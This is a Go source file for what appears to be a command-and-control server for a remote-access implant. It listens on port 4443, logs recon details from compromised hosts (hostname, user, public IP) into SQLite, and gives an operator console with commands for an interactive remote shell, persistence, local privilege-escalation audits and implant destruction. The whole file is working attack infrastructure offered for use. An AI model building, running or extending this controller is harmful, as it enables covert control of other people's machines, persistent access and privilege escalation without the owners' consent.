package main

import (
	"bufio"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"golang.org/x/term"

	_ "modernc.org/sqlite"
)

const PORT = "4443"
const DB_PATH = "zheng.db"

var (
	colorReset  = "\033[0m"
	colorGreen  = "\033[32m"
	colorRed    = "\033[31m"
	colorYellow = "\033[33m"
	colorCyan   = "\033[36m"
	colorBold   = "\033[1m"
)

type Recon struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Kernel   string `json:"kernel"`
	IP       string `json:"ip"`
	PublicIP string `json:"public_ip"`
}

type Client struct {
	ID      int
	Conn    net.Conn
	Addr    string
	Recon   Recon
	Encoder *json.Encoder
	Decoder *json.Decoder
}

var (
	clients      = make(map[int]*Client)
	nextID       = 1
	notifications int
	db           *sql.DB
)

func initDB() {
	var err error
	db, err = sql.Open("sqlite", DB_PATH)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to open db: %v\n", err)
		os.Exit(1)
	}

	schema := `
	CREATE TABLE IF NOT EXISTS clients (
		id INTEGER PRIMARY KEY,
		ip TEXT,
		public_ip TEXT,
		hostname TEXT,
		username TEXT,
		os TEXT,
		arch TEXT,
		first_seen DATETIME,
		last_seen DATETIME,
		active INTEGER DEFAULT 0,
		reconnects INTEGER DEFAULT 0
	);
	CREATE TABLE IF NOT EXISTS lpe_audits (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		client_id INTEGER,
		hostname TEXT,
		username TEXT,
		timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
		result TEXT,
		FOREIGN KEY (client_id) REFERENCES clients(id)
	);`
	if _, err := db.Exec(schema); err != nil {
		fmt.Fprintf(os.Stderr, "failed to create table: %v\n", err)
		os.Exit(1)
	}

	// Initialize nextID from max existing ID
	var maxID sql.NullInt64
	db.QueryRow("SELECT MAX(id) FROM clients").Scan(&maxID)
	if maxID.Valid {
		nextID = int(maxID.Int64) + 1
	}
}

func dbUpsertClient(id int, recon Recon, addr string, active bool, isReconnect bool) {
	now := time.Now().Format(time.RFC3339)
	activeInt := 0
	if active {
		activeInt = 1
	}

	if isReconnect {
		_, err := db.Exec(`
			INSERT INTO clients (id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
			ON CONFLICT(id) DO UPDATE SET
				ip=excluded.ip, public_ip=excluded.public_ip, hostname=excluded.hostname, username=excluded.username,
				os=excluded.os, arch=excluded.arch, last_seen=excluded.last_seen, active=excluded.active,
				reconnects=reconnects+1`,
			id, recon.IP, recon.PublicIP, recon.Hostname, recon.Username, recon.OS, recon.Arch, now, now, activeInt)
		if err != nil {
			fmt.Fprintf(os.Stderr, "db upsert error: %v\n", err)
		}
	} else {
		_, err := db.Exec(`
			INSERT INTO clients (id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0)
			ON CONFLICT(id) DO UPDATE SET
				ip=excluded.ip, public_ip=excluded.public_ip, hostname=excluded.hostname, username=excluded.username,
				os=excluded.os, arch=excluded.arch, last_seen=excluded.last_seen, active=excluded.active`,
			id, recon.IP, recon.PublicIP, recon.Hostname, recon.Username, recon.OS, recon.Arch, now, now, activeInt)
		if err != nil {
			fmt.Fprintf(os.Stderr, "db upsert error: %v\n", err)
		}
	}
}

func dbMarkInactive(id int) {
	db.Exec("UPDATE clients SET active=0 WHERE id=?", id)
}

func getAllClients(onlyActive bool) []map[string]interface{} {
	query := "SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects FROM clients ORDER BY id"
	if onlyActive {
		query = "SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects FROM clients WHERE active = 1 ORDER BY id"
	}
	rows, err := db.Query("SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects FROM clients ORDER BY id")
	if err != nil {
		return nil
	}
	defer rows.Close()

	var result []map[string]interface{}
	for rows.Next() {
		var id, active, reconnects int
		var ip, publicIP, hostname, username, os, arch, firstSeen, lastSeen string
		rows.Scan(&id, &ip, &publicIP, &hostname, &username, &os, &arch, &firstSeen, &lastSeen, &active, &reconnects)
		result = append(result, map[string]interface{}{
			"id": id, "ip": ip, "public_ip": publicIP, "hostname": hostname, "username": username,
			"os": os, "arch": arch, "first_seen": firstSeen, "last_seen": lastSeen, "active": active,
			"reconnects": reconnects,
		})
	}
	return result
}

func dbSaveLPEAudit(clientID int, hostname, username, result string) error {
	_, err := db.Exec(`INSERT INTO lpe_audits (client_id, hostname, username, result) VALUES (?, ?, ?, ?)`,
		clientID, hostname, username, result)
	return err
}

func dbGetLPEAudits(clientID int) ([]map[string]string, error) {
	rows, err := db.Query(`SELECT id, hostname, username, timestamp, result FROM lpe_audits WHERE client_id = ? ORDER BY timestamp DESC`, clientID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var results []map[string]string
	for rows.Next() {
		var id int
		var hostname, username, timestamp, result string
		if err := rows.Scan(&id, &hostname, &username, &timestamp, &result); err != nil {
			continue
		}
		results = append(results, map[string]string{
			"id":        fmt.Sprintf("%d", id),
			"hostname":  hostname,
			"username":  username,
			"timestamp": timestamp,
			"result":    result,
		})
	}
	return results, nil
}

func findClientByRecon(recon Recon) *Client {
	// First check in-memory (active connection)
	for _, c := range clients {
		if c.Recon.Hostname == recon.Hostname && c.Recon.Username == recon.Username {
			return c
		}
	}
	// Then check DB for a previous client with same hostname+username
	var id int
	err := db.QueryRow("SELECT id FROM clients WHERE hostname=? AND username=? ORDER BY last_seen DESC LIMIT 1",
		recon.Hostname, recon.Username).Scan(&id)
	if err == nil {
		// Return a stub with the old ID so addClient can reuse it
		return &Client{ID: id}
	}
	return nil
}

func addClient(conn net.Conn, recon Recon, decoder *json.Decoder, encoder *json.Encoder) *Client {
	existing := findClientByRecon(recon)
	if existing != nil {
		c := &Client{
			ID:      existing.ID,
			Conn:    conn,
			Addr:    conn.RemoteAddr().String(),
			Recon:   recon,
			Encoder: encoder,
			Decoder: decoder,
		}
		clients[existing.ID] = c
		dbUpsertClient(existing.ID, recon, c.Addr, true, true)
		notifications++
		return c
	}

	c := &Client{
		ID:      nextID,
		Conn:    conn,
		Addr:    conn.RemoteAddr().String(),
		Recon:   recon,
		Encoder: encoder,
		Decoder: decoder,
	}
	clients[nextID] = c
	dbUpsertClient(nextID, recon, c.Addr, true, false)
	nextID++
	notifications++
	return c
}

func removeClient(id int) {
	if c, ok := clients[id]; ok {
		c.Conn.Close()
		delete(clients, id)
		dbMarkInactive(id)
	}
}

func printPrompt() {
	if notifications > 0 {
		fmt.Printf("%smaster %s[%d]%s> ", colorBold, colorYellow, notifications, colorReset)
	} else {
		fmt.Printf("%smaster%s> ", colorBold, colorReset)
	}
}

func listClients(onlyActive bool) {
	allClients := getAllClients(onlyActive)
	if len(allClients) == 0 {
		fmt.Println("no clients ever seen")
		return
	}

	fmt.Println()
	fmt.Printf("%-4s %-12s %-15s %-15s %-10s %-6s %-10s %s\n",
		"ID", "STATUS", "IP", "HOSTNAME", "USER", "OS", "RECONNECTS", "LAST SEEN")
	fmt.Println(strings.Repeat("-", 95))

	for _, row := range allClients {
		id := row["id"].(int)
		active := row["active"].(int)
		ip := row["ip"].(string)
		hostname := row["hostname"].(string)
		username := row["username"].(string)
		osName := row["os"].(string)
		lastSeen := row["last_seen"].(string)
		reconnects := row["reconnects"].(int)

		status := ""
		if active == 1 {
			status = fmt.Sprintf("%s● active%s", colorGreen, colorReset)
		} else {
			status = fmt.Sprintf("%s○ inactive%s", colorRed, colorReset)
		}

		reconnStr := fmt.Sprintf("reconnect %d", reconnects)
		if reconnects == 0 {
			reconnStr = "-"
		}

		fmt.Printf("%-4d %-22s %-15s %-15s %-10s %-6s %-10s %-10s\n",
			id, status, ip, hostname, username, osName, reconnStr, lastSeen)
	}
	fmt.Println()

	notifications = 0
}

func sendCommand(c *Client, cmd string) error {
	return c.Encoder.Encode(map[string]string{"cmd": cmd})
}

func readLine(conn net.Conn) (string, error) {
	var buf []byte
	tmp := make([]byte, 1)
	for {
		n, err := conn.Read(tmp)
		if err != nil {
			return "", err
		}
		if n == 0 {
			continue
		}
		if tmp[0] == '\n' {
			return string(buf), nil
		}
		buf = append(buf, tmp[0])
	}
}

func handleShell(c *Client) {
	fmt.Printf("Entering shell on client %d...\n", c.ID)

	if err := sendCommand(c, "shell"); err != nil {
		fmt.Printf("failed to send command: %v\n", err)
		return
	}

	// Read raw lines until we get shell_ready
	// This avoids json.Decoder buffering issues
	for {
		line, err := readLine(c.Conn)
		if err != nil {
			fmt.Printf("connection lost: %v\n", err)
			return
		}
		line = strings.TrimSpace(line)
		if strings.Contains(line, "shell_ready") {
			break
		}
	}

	// Put local terminal into raw mode
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		fmt.Printf("failed to set raw terminal mode: %v\n", err)
		return
	}
	defer func() {
		_ = term.Restore(int(os.Stdin.Fd()), oldState)
		fmt.Println("\n--- Exited Shell ---")
	}()

	done := make(chan struct{})

	// Copy remote shell output to local stdout
	go func() {
		_, _ = io.Copy(os.Stdout, c.Conn)
		close(done)
	}()

	// Copy local stdin to remote shell
	go func() {
		_, _ = io.Copy(c.Conn, os.Stdin)
	}()

	// Wait for shell to exit
	<-done
}

func watchClient(c *Client) {
	var msg map[string]string
	for {
		if err := c.Decoder.Decode(&msg); err != nil {
			break
		}
	}
	removeClient(c.ID)
	fmt.Printf("\n[!] client %d disconnected (%s@%s)\n", c.ID, c.Recon.Username, c.Recon.Hostname)
	printPrompt()
}

func main() {
	initDB()
	defer db.Close()

	listener, err := net.Listen("tcp", ":"+PORT)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to listen on :%s: %v\n", PORT, err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Fprintf(os.Stderr, "%slistening on :%s%s\n", colorCyan, PORT, colorReset)

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			go handleConnection(conn)
		}
	}()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		printPrompt()
		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		cmd := parts[0]

		switch cmd {
		case "/clients":
			onlyActive := parts[1] == "active"
			listClients(onlyActive)

		case "/check":
			if len(parts) < 2 {
				fmt.Println("usage: /check <client_id>")
				continue
			}
			id, err := strconv.Atoi(parts[1])
			if err != nil {
				fmt.Println("invalid client id")
				continue
			}
			c, ok := clients[id]
			if !ok {
				fmt.Printf("client %d not found\n", id)
				continue
			}
			fmt.Printf("%s[*] checking client %d (%s@%s)...%s\n",
				colorCyan, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)

			alive := true
			c.Conn.SetReadDeadline(time.Now().Add(3 * time.Second))

			if err := sendCommand(c, "ping"); err != nil {
				fmt.Printf("%s[-] client %d unreachable: %v%s\n", colorRed, c.ID, err, colorReset)
				alive = false
			} else {
				var pong struct {
					Status string `json:"status"`
				}
				if err := c.Decoder.Decode(&pong); err != nil || pong.Status != "pong" {
					fmt.Printf("%s[-] client %d unreachable%s\n", colorRed, c.ID, colorReset)
					alive = false
				}
			}

			c.Conn.SetReadDeadline(time.Time{})

			if alive {
				fmt.Printf("%s[+] client %d alive%s\n", colorGreen, c.ID, colorReset)
			} else {
				fmt.Printf("%smark client %d as inactive? [y/N]: %s", colorYellow, c.ID, colorReset)
				scanConfirm := bufio.NewScanner(os.Stdin)
				if scanConfirm.Scan() {
					input := strings.TrimSpace(scanConfirm.Text())
					if strings.ToLower(input) == "y" {
						removeClient(c.ID)
						fmt.Printf("%s[!] client %d marked inactive%s\n", colorRed, c.ID, colorReset)
					}
				}
			}

		case "/persist":
			if len(parts) < 2 {
				fmt.Println("usage: /persist <client_id>")
				continue
			}
			id, err := strconv.Atoi(parts[1])
			if err != nil {
				fmt.Println("invalid client id")
				continue
			}
			c, ok := clients[id]
			if !ok {
				fmt.Printf("client %d not found\n", id)
				continue
			}
			fmt.Printf("%s[*] persisting client %d (%s@%s)...%s\n",
				colorCyan, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
			if err := sendCommand(c, "persist"); err != nil {
				fmt.Printf("failed to send command: %v\n", err)
				continue
			}
			var msg struct {
				Status string `json:"status"`
				Error  string `json:"error,omitempty"`
				Detail string `json:"detail,omitempty"`
			}
			if err := c.Decoder.Decode(&msg); err != nil {
				fmt.Printf("connection lost: %v\n", err)
			} else if msg.Status == "persisted" {
				fmt.Printf("%s[+] %s%s\n", colorGreen, msg.Detail, colorReset)
			} else if msg.Status == "persist_fail" {
				fmt.Printf("%s[-] persist failed: %s%s\n", colorRed, msg.Error, colorReset)
			}

		case "/shell":
			if len(parts) < 2 {
				if len(clients) == 1 {
					for _, c := range clients {
						handleShell(c)
					}
				} else if len(clients) == 0 {
					fmt.Println("no active clients")
				} else {
					fmt.Println("usage: /shell <client_id>")
				}
			} else {
				id, err := strconv.Atoi(parts[1])
				if err != nil {
					fmt.Println("invalid client id")
					continue
				}
				if c, ok := clients[id]; ok {
					handleShell(c)
				} else {
					fmt.Printf("client %d not found or inactive\n", id)
				}
			}

		case "/lpe":
			if len(parts) < 2 {
				fmt.Println("usage: /lpe <client_id> [force]")
				continue
			}
			id, err := strconv.Atoi(parts[1])
			if err != nil {
				fmt.Println("invalid client id")
				continue
			}
			c, ok := clients[id]
			if !ok {
				fmt.Printf("client %d not found or inactive\n", id)
				continue
			}

			force := len(parts) >= 3 && parts[2] == "force"

			if !force {
				audits, err := dbGetLPEAudits(id)
				if err == nil && len(audits) > 0 {
					fmt.Printf("%s[*] found %d previous audit(s) for %s@%s%s\n",
						colorCyan, len(audits), c.Recon.Username, c.Recon.Hostname, colorReset)
					fmt.Println()
					for i, audit := range audits {
						fmt.Printf("%s=== Audit #%d - %s (%s@%s) ===%s\n",
							colorBold, i+1, audit["timestamp"], audit["username"], audit["hostname"], colorReset)
						fmt.Println(audit["result"])
						fmt.Println()
					}
					continue
				}
			}

			fmt.Printf("%s[*] running LPE audit on client %d (%s@%s)...%s\n",
				colorCyan, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
			if err := sendCommand(c, "lpe"); err != nil {
				fmt.Printf("failed to send command: %v\n", err)
				continue
			}

			var statusMsg struct {
				Status string `json:"status"`
			}
			c.Decoder.Decode(&statusMsg)

			var resultMsg struct {
				Status string `json:"status"`
				Output string `json:"output"`
				Error  string `json:"error,omitempty"`
			}
			if err := c.Decoder.Decode(&resultMsg); err != nil {
				fmt.Printf("connection lost: %v\n", err)
				continue
			}

			fmt.Println()
			fmt.Printf("%s=== LPE AUDIT RESULTS for %s@%s ===%s\n", colorBold, c.Recon.Username, c.Recon.Hostname, colorReset)
			fmt.Println()
			if resultMsg.Status == "lpe_done" {
				fmt.Println(resultMsg.Output)
				if err := dbSaveLPEAudit(id, c.Recon.Hostname, c.Recon.Username, resultMsg.Output); err != nil {
					fmt.Printf("%s[-] failed to save audit to db: %v%s\n", colorRed, err, colorReset)
				} else {
					fmt.Printf("%s[+] audit saved to database%s\n", colorGreen, colorReset)
				}
			} else {
				fmt.Printf("%s[-] audit failed: %s%s\n", colorRed, resultMsg.Error, colorReset)
				if resultMsg.Output != "" {
					fmt.Println(resultMsg.Output)
				}
			}
			fmt.Println()

		case "/clear":
			fmt.Print("\033[H\033[2J")

		case "/destroy":
			if len(parts) < 2 {
				fmt.Println("usage: /destroy <client_id>")
				continue
			}
			id, err := strconv.Atoi(parts[1])
			if err != nil {
				fmt.Println("invalid client id")
				continue
			}
			c, ok := clients[id]
			if !ok {
				fmt.Printf("client %d not found\n", id)
				continue
			}
			fmt.Printf("%s[!] destroying client %d (%s@%s)...%s\n",
				colorYellow, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
			if err := sendCommand(c, "destroy"); err != nil {
				fmt.Printf("failed to send destroy: %v\n", err)
				continue
			}
			var msg struct {
				Status string `json:"status"`
				Error  string `json:"error,omitempty"`
			}
			if err := c.Decoder.Decode(&msg); err != nil {
				fmt.Printf("connection lost: %v\n", err)
			} else if msg.Status == "destroyed" {
				fmt.Printf("%s[+] client %d destroyed%s\n", colorGreen, c.ID, colorReset)
			} else if msg.Status == "destroy_fail" {
				fmt.Printf("%s[-] destroy failed: %s%s\n", colorRed, msg.Error, colorReset)
			}

		case "/done":
			fmt.Println("exiting...")
			for id := range clients {
				removeClient(id)
			}
			os.Exit(0)

		default:
			fmt.Printf("unknown command: %s\n", cmd)
			fmt.Println("commands: /clients, /check <id>, /persist <id>, /shell <id>, /lpe <id> [force], /destroy <id>, /clear, /done")
		}
	}
}

func handleConnection(conn net.Conn) {
	decoder := json.NewDecoder(conn)
	encoder := json.NewEncoder(conn)

	var recon Recon
	if err := decoder.Decode(&recon); err != nil {
		fmt.Fprintf(os.Stderr, "failed to read recon from %s: %v\n", conn.RemoteAddr(), err)
		conn.Close()
		return
	}

	c := addClient(conn, recon, decoder, encoder)
	fmt.Printf("\n%s[+] client %d connected: %s@%s (%s) from %s%s\n",
		colorGreen, c.ID, recon.Username, recon.Hostname, recon.IP, c.Addr, colorReset)
	printPrompt()

	watchClient(c)
}
